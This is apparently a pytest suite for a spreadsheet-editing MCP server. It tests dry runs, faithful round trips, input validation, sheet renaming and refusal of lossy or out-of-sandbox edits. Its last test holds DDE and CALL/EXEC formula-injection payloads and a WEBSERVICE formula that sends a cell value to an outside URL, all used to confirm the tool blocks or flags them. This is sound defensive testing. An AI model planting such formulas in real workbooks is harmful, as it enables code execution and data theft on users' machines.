"""Editing tools: dry run, refusal, round trips that prove untouched content is identical."""

from __future__ import annotations

import datetime as dt
import os
import zipfile
from pathlib import Path
from typing import Any

import openpyxl
import pytest
from conftest import add_parts, build_excel_like

from sheet_mcp import server
from sheet_mcp.errors import SheetError


def snapshot(path: Path) -> dict[str, Any]:
    """Everything a user would call 'the workbook', for equality checks."""
    wb = openpyxl.load_workbook(path)
    snap: dict[str, Any] = {"order": wb.sheetnames, "names": {}, "sheets": {}}
    for name, dn in wb.defined_names.items():
        snap["names"][name] = dn.attr_text
    for ws in wb.worksheets:
        cells = {}
        for (r, c), cell in ws._cells.items():
            v = cell.value
            if hasattr(v, "text"):
                v = ("array", v.ref, v.text)
            cells[(r, c)] = (
                v,
                cell.data_type,
                cell.number_format,
                repr(cell.font),
                repr(cell.fill),
                repr(cell.border),
                repr(cell.alignment),
                repr(cell.protection),
                cell.comment.text if cell.comment else None,
                cell.comment.author if cell.comment else None,
            )
        snap["sheets"][ws.title] = {
            "cells": cells,
            "merged": sorted(str(m) for m in ws.merged_cells.ranges),
            "widths": {k: d.width for k, d in ws.column_dimensions.items()},
            "hidden_rows": [k for k, d in ws.row_dimensions.items() if d.hidden],
            "dv": [(str(dv.sqref), dv.type, dv.formula1) for dv in ws.data_validations.dataValidation],
            "cf": [
                (str(cf.sqref), [(r.type, r.operator, r.formula) for r in cf.rules])
                for cf in ws.conditional_formatting
            ],
            "tables": {t.name: t.ref for t in ws.tables.values()},
            "state": ws.sheet_state,
        }
    return snap


def changed_cells(before: dict[str, Any], after: dict[str, Any], sheet: str) -> set[tuple[int, int]]:
    b, a = before["sheets"][sheet]["cells"], after["sheets"][sheet]["cells"]
    return {k for k in set(a) | set(b) if a.get(k) != b.get(k)}


def test_dry_run_is_the_default_and_writes_nothing(rich: Path) -> None:
    before = rich.read_bytes()
    out = server.set_cells("rich.xlsx", "Sales", [{"cell": "B2", "value": 99}])
    assert "Would change 1 cell" in out and "DRY RUN" in out
    assert "| Sales!B2 | 2 | number 99 |" in out
    assert rich.read_bytes() == before
    assert not (rich.parent / "rich.edited.xlsx").exists()


def test_set_cells_roundtrip_leaves_everything_else_identical(rich: Path) -> None:
    before = snapshot(rich)
    original_bytes = rich.read_bytes()
    out = server.set_cells(
        "rich.xlsx",
        "Sales",
        [
            {"cell": "B2", "value": 99},
            {"cell": "A9", "value": "new text"},
            {"cell": "D10", "formula": "SUM(D2:D9)"},
        ],
        dry_run=False,
    )
    assert "Saved" in out and "original rich.xlsx was not modified" in out
    assert rich.read_bytes() == original_bytes  # never in place by default
    edited = rich.with_name("rich.edited.xlsx")
    after = snapshot(edited)
    assert changed_cells(before, after, "Sales") == {(2, 2), (9, 1), (10, 4)}
    assert changed_cells(before, after, "Other") == set()
    # styles of the edited cells survive too
    assert after["sheets"]["Sales"]["cells"][(2, 2)][2] == before["sheets"]["Sales"]["cells"][(2, 2)][2]
    assert after["sheets"]["Sales"]["cells"][(2, 2)][6] == before["sheets"]["Sales"]["cells"][(2, 2)][6]  # alignment
    for key in ("merged", "widths", "hidden_rows", "dv", "cf", "tables", "state"):
        assert after["sheets"]["Sales"][key] == before["sheets"]["Sales"][key], key
    assert after["names"] == before["names"] and after["order"] == before["order"]
    # formulas are still formulas, never replaced by values
    wb = openpyxl.load_workbook(edited)
    assert wb["Sales"]["D2"].value == "=B2*C2"
    assert wb["Sales"]["D10"].value == "=SUM(D2:D9)"
    assert wb["Other"]["A3"].value == "=Sales!$D$10+SUM(Sales!B2:B8)"
    assert "cached results" in out


def test_formulas_with_cached_values_survive_as_formulas(excel_like: Path) -> None:
    server.set_cells("excel.xlsx", "Veri", [{"cell": "B2", "value": 5}], dry_run=False)
    wb = openpyxl.load_workbook(excel_like.with_name("excel.edited.xlsx"))
    ws = wb["Veri"]
    assert [ws[f"D{r}"].value for r in (2, 3, 4)] == ["=B2*C2", "=B3*C3", "=B4*C4"]  # shared formula expanded
    assert ws["D5"].value == "=SUM(D2:D4)"
    assert ws["F5"].value == "=1/0"
    assert ws["A2"].value == "Şeker" and ws["A3"].value == "İzmir çayı"


def test_value_coercion_rules(rich: Path) -> None:
    server.set_cells(
        "rich.xlsx",
        "Sales",
        [
            {"cell": "F2", "value": "=SUM(B2:B8)"},
            {"cell": "F3", "value": "'=not a formula"},
            {"cell": "F4", "value": "'007"},
            {"cell": "F5", "value": "007"},
            {"cell": "F6", "value": "123"},
            {"cell": "F7", "value": True},
            {"cell": "F8", "value": 3.25},
            {"cell": "F9", "value": "2024-12-31"},
            {"cell": "G5", "value": "2024-12-31T10:30"},
            {"cell": "A9", "value": "#REF!"},
            {"cell": "A8", "value": None},
            {"cell": "G6", "value": "Şişli İstanbul ığ"},
        ],
        dry_run=False,
    )
    ws = openpyxl.load_workbook(rich.with_name("rich.edited.xlsx"))["Sales"]
    assert ws["F2"].value == "=SUM(B2:B8)" and ws["F2"].data_type == "f"
    assert ws["F3"].value == "=not a formula" and ws["F3"].data_type == "s"
    assert ws["F4"].value == "007" and ws["F5"].value == "007" and ws["F6"].value == "123"
    assert ws["F6"].data_type == "s"  # strings are never auto-converted to numbers
    assert ws["F7"].value is True and ws["F8"].value == 3.25
    assert ws["F9"].value == dt.datetime(2024, 12, 31) and "yyyy" in ws["F9"].number_format
    assert ws["G5"].value == dt.datetime(2024, 12, 31, 10, 30)
    assert ws["A9"].value == "#REF!" and ws["A9"].data_type == "s"
    assert ws["A8"].value is None
    assert ws["G6"].value == "Şişli İstanbul ığ"


def test_date_written_into_date_formatted_cell_keeps_its_format(rich: Path) -> None:
    server.set_cells("rich.xlsx", "Sales", [{"cell": "E2", "value": "2030-01-02"}], dry_run=False)
    ws = openpyxl.load_workbook(rich.with_name("rich.edited.xlsx"))["Sales"]
    assert ws["E2"].number_format == "dd/mm/yyyy"
    assert ws["E2"].value == dt.datetime(2030, 1, 2)


def test_replacing_a_formula_is_flagged(rich: Path) -> None:
    out = server.set_cells("rich.xlsx", "Sales", [{"cell": "D2", "value": 5}])
    assert "REPLACES A FORMULA" in out and "=B2*C2" in out


def test_refuses_merged_interior_array_and_bad_cells(rich: Path, _sandbox: Path) -> None:
    with pytest.raises(SheetError, match="inside the merged range G1:H2"):
        server.set_cells("rich.xlsx", "Sales", [{"cell": "H2", "value": 1}], dry_run=False)
    # the merged anchor itself is writable
    server.set_cells("rich.xlsx", "Sales", [{"cell": "G1", "value": 1}])
    wb = openpyxl.Workbook()
    ws = wb.active
    assert ws is not None
    ws["A1"] = 1
    ws["A2"] = 2
    ws["B1"] = openpyxl.worksheet.formula.ArrayFormula("B1:B2", "=A1:A2*2")  # type: ignore[attr-defined]
    wb.save(_sandbox / "arr.xlsx")
    for cell in ("B1", "B2"):
        with pytest.raises(SheetError, match="array formula over B1:B2"):
            server.set_cells("arr.xlsx", "Sheet", [{"cell": cell, "value": 1}])
    for bad in ("B", "A1:B2", "1A", "ZZZZ1", "A0", "A1048577", ""):
        with pytest.raises(SheetError):
            server.set_cells("rich.xlsx", "Sales", [{"cell": bad, "value": 1}])


def test_bad_change_objects(rich: Path) -> None:
    with pytest.raises(SheetError, match="both value and formula"):
        server.set_cells("rich.xlsx", "Sales", [{"cell": "A1", "value": 1, "formula": "=1"}])
    with pytest.raises(SheetError, match="needs 'value'"):
        server.set_cells("rich.xlsx", "Sales", [{"cell": "A1"}])
    with pytest.raises(SheetError, match="unknown key"):
        server.set_cells("rich.xlsx", "Sales", [{"cell": "A1", "value": 1, "colour": "red"}])
    with pytest.raises(SheetError, match="appears twice"):
        server.set_cells("rich.xlsx", "Sales", [{"cell": "A1", "value": 1}, {"cell": "a1", "value": 2}])
    with pytest.raises(SheetError, match="changes is empty"):
        server.set_cells("rich.xlsx", "Sales", [])
    with pytest.raises(SheetError, match="unsupported value"):
        server.set_cells("rich.xlsx", "Sales", [{"cell": "A1", "value": {"x": 1}}])
    with pytest.raises(SheetError, match="NaN"):
        server.set_cells("rich.xlsx", "Sales", [{"cell": "A1", "value": float("nan")}])
    with pytest.raises(SheetError, match="unbalanced"):
        server.set_cells("rich.xlsx", "Sales", [{"cell": "A1", "value": "=SUM(A1"}])
    with pytest.raises(SheetError, match="sheet 'Missing', which does not exist"):
        server.set_cells("rich.xlsx", "Sales", [{"cell": "A1", "value": "=Missing!A1"}])
    with pytest.raises(SheetError, match="characters"):
        server.set_cells("rich.xlsx", "Sales", [{"cell": "A1", "value": "x" * 40000}])
    with pytest.raises(SheetError):
        server.set_cells("rich.xlsx", "Sales", [{"cell": "A1", "value": "bad \x01 char"}], dry_run=False)


def test_soft_warnings_for_new_functions(rich: Path) -> None:
    out = server.set_cells("rich.xlsx", "Sales", [{"cell": "F1", "value": "=XLOOKUP(1,A1:A2,B1:B2)"}, {"cell": "F2", "value": "=FILTER(A1:A5,B1:B5>1)"}])
    assert "_xlfn.XLOOKUP" in out and "dynamic-array" in out
    big = server.set_cells("rich.xlsx", "Sales", [{"cell": "F1", "value": 10**16}])
    assert "15 significant digits" in big


def test_output_is_never_overwritten_unless_asked(rich: Path) -> None:
    server.set_cells("rich.xlsx", "Sales", [{"cell": "B2", "value": 1}], dry_run=False)
    first = rich.with_name("rich.edited.xlsx").read_bytes()
    with pytest.raises(SheetError, match="already exists"):
        server.set_cells("rich.xlsx", "Sales", [{"cell": "B2", "value": 2}], dry_run=False)
    with pytest.raises(SheetError, match="already exists"):  # even a dry run tells you early
        server.set_cells("rich.xlsx", "Sales", [{"cell": "B2", "value": 2}])
    assert rich.with_name("rich.edited.xlsx").read_bytes() == first
    server.set_cells("rich.xlsx", "Sales", [{"cell": "B2", "value": 2}], dry_run=False, overwrite=True)
    assert openpyxl.load_workbook(rich.with_name("rich.edited.xlsx"))["Sales"]["B2"].value == 2


def test_in_place_needs_explicit_output_and_overwrite(rich: Path) -> None:
    with pytest.raises(SheetError, match="already exists"):
        server.set_cells("rich.xlsx", "Sales", [{"cell": "B2", "value": 7}], dry_run=False, output="rich.xlsx")
    out = server.set_cells("rich.xlsx", "Sales", [{"cell": "B2", "value": 7}], dry_run=False, output="rich.xlsx", overwrite=True)
    assert "replaced in place" in out
    assert openpyxl.load_workbook(rich)["Sales"]["B2"].value == 7


def test_output_extension_and_sandbox(rich: Path) -> None:
    with pytest.raises(SheetError, match="extension"):
        server.set_cells("rich.xlsx", "Sales", [{"cell": "B2", "value": 1}], output="x.xlsm")
    with pytest.raises(SheetError, match="outside the allowed directory"):
        server.set_cells("rich.xlsx", "Sales", [{"cell": "B2", "value": 1}], output="../evil.xlsx")
    with pytest.raises(SheetError, match="does not exist"):
        server.set_cells("rich.xlsx", "Sales", [{"cell": "B2", "value": 1}], output="nodir/x.xlsx")


def test_no_temp_files_left_behind(rich: Path) -> None:
    server.set_cells("rich.xlsx", "Sales", [{"cell": "B2", "value": 1}], dry_run=False)
    with pytest.raises(SheetError):
        server.set_cells("rich.xlsx", "Sales", [{"cell": "B2", "value": 1}], dry_run=False)
    assert sorted(p.name for p in rich.parent.iterdir()) == ["rich.edited.xlsx", "rich.xlsx"]


def test_lossy_workbook_is_refused_then_allowed(rich: Path) -> None:
    lossy = add_parts(rich, rich.with_name("chart.xlsx"), {"xl/charts/chart1.xml": "<c/>", "xl/pivotTables/p.xml": "<p/>"})
    out = server.set_cells("chart.xlsx", "Sales", [{"cell": "B2", "value": 1}])  # dry run still works
    assert "REFUSED" in out
    with pytest.raises(SheetError) as ei:
        server.set_cells("chart.xlsx", "Sales", [{"cell": "B2", "value": 1}], dry_run=False)
    msg = str(ei.value)
    assert "Refusing to edit" in msg and "charts" in msg and "pivot tables" in msg and "allow_loss=true" in msg
    assert not lossy.with_name("chart.edited.xlsx").exists()
    server.set_cells("chart.xlsx", "Sales", [{"cell": "B2", "value": 1}], dry_run=False, allow_loss=True)
    assert lossy.with_name("chart.edited.xlsx").exists()
    for tool_call in (
        lambda: server.append_rows("chart.xlsx", "Sales", [[1]], dry_run=False, output="o1.xlsx"),
        lambda: server.add_sheet("chart.xlsx", "N", dry_run=False, output="o2.xlsx"),
        lambda: server.rename_sheet("chart.xlsx", "Other", "N", dry_run=False, output="o3.xlsx"),
    ):
        with pytest.raises(SheetError, match="Refusing to edit"):
            tool_call()


def test_xlsm_macros_refused_then_kept_with_allow_loss(rich: Path) -> None:
    ct = zipfile.ZipFile(rich).read("[Content_Types].xml").decode().replace(
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml",
        "application/vnd.ms-excel.sheet.macroEnabled.main+xml",
    )
    macro = add_parts(rich, rich.with_name("m.xlsm"), {"xl/vbaProject.bin": b"VBA-BYTES"}, rename={"[Content_Types].xml": ct})
    with pytest.raises(SheetError, match="macros"):
        server.set_cells("m.xlsm", "Sales", [{"cell": "B2", "value": 1}], dry_run=False)
    server.set_cells("m.xlsm", "Sales", [{"cell": "B2", "value": 1}], dry_run=False, allow_loss=True)
    out = macro.with_name("m.edited.xlsm")
    z = zipfile.ZipFile(out)
    assert z.read("xl/vbaProject.bin") == b"VBA-BYTES"
    assert b"macroEnabled" in z.read("[Content_Types].xml")


def test_cross_sheet_change(rich: Path) -> None:
    server.set_cells("rich.xlsx", "Sales", [{"cell": "Z1", "value": "z"}, {"sheet": "Other", "cell": "C1", "value": 4}], dry_run=False)
    wb = openpyxl.load_workbook(rich.with_name("rich.edited.xlsx"))
    assert wb["Sales"]["Z1"].value == "z" and wb["Other"]["C1"].value == 4


# ----------------------------------------------------------------------- append_rows


def test_append_rows_copies_styles_and_extends_the_table(rich: Path) -> None:
    ws = openpyxl.load_workbook(rich)["Sales"]
    assert ws.tables["Sales1"].ref == "A1:E8"
    out = server.append_rows("rich.xlsx", "Sales", [["Item 9", 9, 94.5, "=B9*C9", "2024-03-09"]], table="Sales1")
    assert "rows 9-9" in out and "DRY RUN" in out
    out = server.append_rows("rich.xlsx", "Sales", [["Item 9", 9, 94.5, "=B9*C9", "2024-03-09"]], table="Sales1", dry_run=False)
    assert "Appended 1 row(s)" in out
    new = openpyxl.load_workbook(rich.with_name("rich.edited.xlsx"))["Sales"]
    assert new.tables["Sales1"].ref == "A1:E9"
    assert new["D9"].value == "=B9*C9" and new["B9"].value == 9
    assert new["E9"].number_format == "dd/mm/yyyy" and new["E9"].value == dt.datetime(2024, 3, 9)
    assert new["C9"].number_format == '#,##0.00 "TL"'
    assert new["B9"].alignment.horizontal == "right" and new["B9"].font.italic
    assert new["D10"].value == "=SUM(D2:D8)"  # the row below is untouched


def test_append_rows_warns_about_validation_and_cf_ranges(rich: Path) -> None:
    out = server.append_rows("rich.xlsx", "Sales", [["x"]], table="Sales1")
    assert "does not extend" not in out  # ranges end at row 9, last table row is 8
    wb = openpyxl.Workbook()
    ws = wb.active
    assert ws is not None
    ws.append(["h", "v"])
    ws.append(["a", 1])
    from openpyxl.worksheet.datavalidation import DataValidation

    dv = DataValidation(type="whole", operator="between", formula1="0", formula2="10")
    ws.add_data_validation(dv)
    dv.add("B2:B2")
    ws.conditional_formatting.add("B2:B2", openpyxl.formatting.rule.CellIsRule(operator="equal", formula=["1"]))  # type: ignore[attr-defined]
    wb.save(rich.with_name("dv.xlsx"))
    out = server.append_rows("dv.xlsx", "Sheet", [["b", 2]])
    assert "data validation on B2 does not extend" in out and "conditional formatting on B2" in out


def test_append_refuses_table_ambiguity_totals_and_occupied_space(rich: Path, _sandbox: Path) -> None:
    from openpyxl.worksheet.table import Table

    wb = openpyxl.Workbook()
    ws = wb.active
    assert ws is not None
    ws.append(["a", "b"])
    ws.append([1, 2])
    ws.add_table(Table(displayName="T", ref="A1:B2"))
    wb.save(_sandbox / "t.xlsx")
    with pytest.raises(SheetError, match="Pass table='T'"):
        server.append_rows("t.xlsx", "Sheet", [[3, 4]])
    with pytest.raises(SheetError, match="no table named"):
        server.append_rows("rich.xlsx", "Sales", [["x"]], table="Nope")
    with pytest.raises(SheetError, match="not empty"):
        server.append_rows("rich.xlsx", "Sales", [["x"], ["y"]], table="Sales1")  # row 10 holds the totals
    with pytest.raises(SheetError, match="wide"):
        server.append_rows("rich.xlsx", "Sales", [[1, 2, 3, 4, 5, 6]], table="Sales1")
    with pytest.raises(SheetError, match="rows is empty"):
        server.append_rows("rich.xlsx", "Sales", [])
    with pytest.raises(SheetError, match="merged range"):
        wb2 = openpyxl.Workbook()
        ws2 = wb2.active
        assert ws2 is not None
        ws2["A1"] = "x"
        ws2.merge_cells("A2:B2")
        wb2.save(_sandbox / "mg.xlsx")
        server.append_rows("mg.xlsx", "Sheet", [["y"]])
    wb3 = openpyxl.Workbook()
    ws3 = wb3.active
    assert ws3 is not None
    ws3.append(["a"])
    ws3.append(["b"])
    ws3.add_table(Table(displayName="TT", ref="A1:A2", totalsRowCount=1))
    wb3.save(_sandbox / "tot.xlsx")
    with pytest.raises(SheetError, match="totals row"):
        server.append_rows("tot.xlsx", "Sheet", [["c"]], table="TT")


def test_append_without_a_table_goes_after_last_data_row(_sandbox: Path) -> None:
    wb = openpyxl.Workbook()
    ws = wb.active
    assert ws is not None
    ws["C3"] = "x"
    ws["D3"] = 1.5
    ws["D3"].number_format = "0.00"
    wb.save(_sandbox / "plain.xlsx")
    server.append_rows("plain.xlsx", "Sheet", [["y", 2.25]], dry_run=False)
    new = openpyxl.load_workbook(_sandbox / "plain.edited.xlsx")["Sheet"]
    assert new["C4"].value == "y" and new["D4"].value == 2.25 and new["D4"].number_format == "0.00"


# ----------------------------------------------------------------------- sheets


def test_add_sheet(rich: Path) -> None:
    out = server.add_sheet("rich.xlsx", "Yeni Sayfa", position=1)
    assert "Would add" in out and "DRY RUN" in out
    server.add_sheet("rich.xlsx", "Yeni Sayfa", position=1, dry_run=False)
    assert openpyxl.load_workbook(rich.with_name("rich.edited.xlsx")).sheetnames == ["Yeni Sayfa", "Sales", "Other"]
    for bad in ("sales", "", "a" * 32, "a/b", "[x]", "'q", "History"):
        with pytest.raises(SheetError):
            server.add_sheet("rich.xlsx", bad, output="zz.xlsx")
    with pytest.raises(SheetError, match="position"):
        server.add_sheet("rich.xlsx", "Z", position=9, output="zz.xlsx")


def test_rename_sheet_updates_references_everywhere(rich: Path) -> None:
    dry = server.rename_sheet("rich.xlsx", "Sales", "Satışlar 2024")
    assert "Other!A1" in dry and "'Satışlar 2024'!D2*2" in dry and "DRY RUN" in dry
    server.rename_sheet("rich.xlsx", "Sales", "Satışlar 2024", dry_run=False)
    wb = openpyxl.load_workbook(rich.with_name("rich.edited.xlsx"))
    assert wb.sheetnames == ["Satışlar 2024", "Other"]
    other = wb["Other"]
    assert other["A1"].value == "='Satışlar 2024'!D2*2"
    assert other["A3"].value == "='Satışlar 2024'!$D$10+SUM('Satışlar 2024'!B2:B8)"
    assert other["A2"].value == 'Sales total: Sales!D10 and "Sales"'  # text untouched
    assert wb.defined_names["Rate"].attr_text == "'Satışlar 2024'!$C$2"
    assert wb["Satışlar 2024"]["D2"].value == "=B2*C2"


def test_rename_handles_quotes_3d_and_literals(_sandbox: Path) -> None:
    wb = openpyxl.Workbook()
    a = wb.active
    assert a is not None
    a.title = "A"
    wb.create_sheet("B")
    wb.create_sheet("C")
    a["A1"] = "=SUM(A:C!A1)" if False else "=SUM(B!A1:A3)+C!A1"
    a["A2"] = '=IF(B!A1>0,"B!A1 stays",B!A2)'
    a["A3"] = "=SUM(B:C!A1)"
    wb["C"]["A1"] = "='B'!A1"
    wb.save(_sandbox / "r.xlsx")
    server.rename_sheet("r.xlsx", "B", "Bee's", dry_run=False)
    wb2 = openpyxl.load_workbook(_sandbox / "r.edited.xlsx")
    assert wb2["A"]["A1"].value == "=SUM('Bee''s'!A1:A3)+C!A1"
    assert wb2["A"]["A2"].value == '=IF(\'Bee\'\'s\'!A1>0,"B!A1 stays",\'Bee\'\'s\'!A2)'
    assert wb2["A"]["A3"].value == "=SUM('Bee''s:C'!A1)"
    assert wb2["C"]["A1"].value == "='Bee''s'!A1"


def test_rename_rules(rich: Path) -> None:
    with pytest.raises(SheetError, match="already exists"):
        server.rename_sheet("rich.xlsx", "Sales", "other")
    with pytest.raises(SheetError, match="no sheet named"):
        server.rename_sheet("rich.xlsx", "Nope", "X")
    with pytest.raises(SheetError, match="31"):
        server.rename_sheet("rich.xlsx", "Sales", "x" * 40)
    server.rename_sheet("rich.xlsx", "Sales", "SALES", dry_run=False)  # case-only rename is allowed
    assert openpyxl.load_workbook(rich.with_name("rich.edited.xlsx")).sheetnames == ["SALES", "Other"]


def test_rename_updates_validation_cf_and_hyperlinks(_sandbox: Path) -> None:
    from openpyxl.formatting.rule import FormulaRule
    from openpyxl.worksheet.datavalidation import DataValidation

    wb = openpyxl.Workbook()
    ws = wb.active
    assert ws is not None
    ws.title = "Src"
    other = wb.create_sheet("Lists")
    other["A1"] = "x"
    ws["A1"] = "go"
    ws["A1"].hyperlink = "#Lists!A1"
    ws["A1"].hyperlink.location = "Lists!A1"  # type: ignore[union-attr]
    dv = DataValidation(type="list", formula1="=Lists!$A$1:$A$5")
    ws.add_data_validation(dv)
    dv.add("B1")
    ws.conditional_formatting.add("C1", FormulaRule(formula=["Lists!$A$1=1"]))
    wb.save(_sandbox / "v.xlsx")
    out = server.rename_sheet("v.xlsx", "Lists", "Listeler")
    assert "1 defined name" in out or "validation/conditional-format" in out
    server.rename_sheet("v.xlsx", "Lists", "Listeler", dry_run=False)
    new = openpyxl.load_workbook(_sandbox / "v.edited.xlsx")["Src"]
    assert new.data_validations.dataValidation[0].formula1 == "=Listeler!$A$1:$A$5"
    assert [r.formula for cf in new.conditional_formatting for r in cf.rules] == [["Listeler!$A$1=1"]]
    assert new["A1"].hyperlink.location == "Listeler!A1"


def test_unlinked_file_kept_after_failed_save(rich: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from sheet_mcp import editor

    real_inspect = editor.package._inspect_uncached

    def fake(path: str) -> Any:
        info = real_inspect(path)
        if ".sheetmcp-" in path:  # only the freshly written temp file looks wrong
            info.sheets[0].n_formulas += 1
        return info

    monkeypatch.setattr(editor.package, "_inspect_uncached", fake)
    with pytest.raises(SheetError, match="different formula counts"):
        server.set_cells("rich.xlsx", "Sales", [{"cell": "B2", "value": 1}], dry_run=False)
    assert sorted(p.name for p in rich.parent.iterdir()) == ["rich.xlsx"]


def test_replace_failure_reports_open_file(rich: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    def deny(src: Any, dst: Any) -> None:
        raise PermissionError("locked")

    monkeypatch.setattr(os, "replace", deny)
    with pytest.raises(SheetError, match="open in Excel"):
        server.set_cells("rich.xlsx", "Sales", [{"cell": "B2", "value": 1}], dry_run=False)
    assert sorted(p.name for p in rich.parent.iterdir()) == ["rich.xlsx"]


def test_excel_like_file_roundtrip_keeps_second_edit_stable(_sandbox: Path) -> None:
    build_excel_like(_sandbox / "x.xlsx")
    server.set_cells("x.xlsx", "Veri", [{"cell": "B2", "value": 5}], dry_run=False)
    first = snapshot(_sandbox / "x.edited.xlsx")
    server.set_cells("x.edited.xlsx", "Veri", [{"cell": "B2", "value": 5}], dry_run=False, output="x.again.xlsx")
    assert snapshot(_sandbox / "x.again.xlsx") == first


def test_dde_and_external_code_formulas_are_refused(rich: Path) -> None:
    for evil in ("=cmd|' /C calc'!A0", "=CALL(\"kernel32\",\"WinExec\")", "=EXEC(\"calc\")", "=REGISTER.ID(\"x\")"):
        with pytest.raises(SheetError, match="DDE"):
            server.set_cells("rich.xlsx", "Sales", [{"cell": "F1", "value": evil}])
    # a pipe inside a string literal is fine
    server.set_cells("rich.xlsx", "Sales", [{"cell": "F1", "value": "=\"a|'b\""}])
    out = server.set_cells("rich.xlsx", "Sales", [{"cell": "F1", "value": '=WEBSERVICE("http://example.com/"&A1)'}])
    assert "fetches data from outside" in out
